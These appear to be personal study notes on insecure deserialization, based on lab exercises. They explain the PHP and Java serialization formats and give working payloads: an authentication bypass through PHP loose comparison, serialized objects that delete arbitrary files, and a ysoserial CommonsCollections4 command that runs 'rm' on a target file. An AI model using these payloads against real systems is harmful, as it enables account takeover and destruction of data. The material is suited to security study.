# Insecure Deserialization
## Serialization and deserialization
Serialization is the process of converting complex data structures such as objects into a "flatter" format that can be sent and received as a sequential stream of bytes.
Deserialization is a reverse process.  
## Insecure deserialization
Insecure deser appears when suer-controllable data is deserializaed by website.  
This enables attacker to manipulate serialized objects to pass harmful data into the application code.  
This buln is also called "onject injection"  
## Identifying
We need to inspect all requests to detect any data that is possibly serialized  
## PHP serialization format
`User` object:
```
$user->name = "carlos";
$user->isLoggedIn = true;
```
When serialized object may look like this:
```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```
Interpreting:
* O:4:"User" - An object with the 4-character class name "User" 
* 2 - the object has 2 attributes 
* s:4:"name" - The key of the first attribute is the 4-character string "name" 
* s:6:"carlos" - The value of the first attribute is the 6-character string "carlos" 
* s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn" 
* b:1 - The value of the second attribute is the boolean value true 
PHP uses `serialize()` and `unserialize()` methods. If we have source code, we need start looking for `unserialize()` method.  
## Java ser format
Some langs such as Java are using binary format for serialization. All serialized Java objects always begin with same bytes, which are encoded as `ac ed` in hex and `r00` in bas64.  
Any class that implements interface `java.io.Serializable` can be serd and deserd. If we have source code, note any code that uses `readObject()` method, which is used to read and deserialize data from an `InputStream` 

## Modifying object
If we detect serialized object, we are able to decode it and change object attributes, then re-encode it and replace original object (for example cookie)  

## Modifying data types
We can not only modify existing attributes, but also supply unexpected data types  
For example we can use PHP looce comparison operato `==` to exploit this lind of vuln.  
When 0 is compared to any string it equals true, because string doesn't contain any string so it equals to 0  
So, in such case:
```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```
We can modify password attribute to 0, and it will always return `true`, when compared to string password.  

Example:
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
Here we changed `acccess token` to integer 0  

## Using application functionality
If app deletes, for example, user's photo during some process (e.g. user deletion) and this proces is deserialized, we can potentially modify the location of deleted file and delete something else  
```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"oe27t7ht5ywq0wzxxscz5237579ymm6o";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
## Magic methods
Some code uses magic methods to build objects. So possibly we can investigate code for such methods and try to create arbitrary object.  
Sometimes we could be able to access soruce code with appending `~` to file name to accesss backup file  
For example, we can detect smth like:
```
function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
``` 
We see a amgic method `__destruct()` inside calss CustomTemplate. So we can do such thing:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
This will create object of CustomTemplate class with lock_file_path which is used by `unlink()` function inside class and we delete arbitrary file.  

## Gadget chains
"gadget" is snipept of code which can help an attacker to achieve a goal.  
Attacker's goal could be to invoke a method from one gadget which will pass their input to another gadget.  
Detecting gadget chain is very hard process. SOmetimes we could be able to use pre-built gadget chains with next tools:
* ysoserial
* Java-Deserialization-Scanner eextension  
Java 16+ needs additional arguments to run ysoserial. To create ready exploit, encoded into base64, without spaces, we can use
```
java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | sed ':a;N;$!ba;s/\n/ /g;s/ //g' | xclip -selection clipboard
```

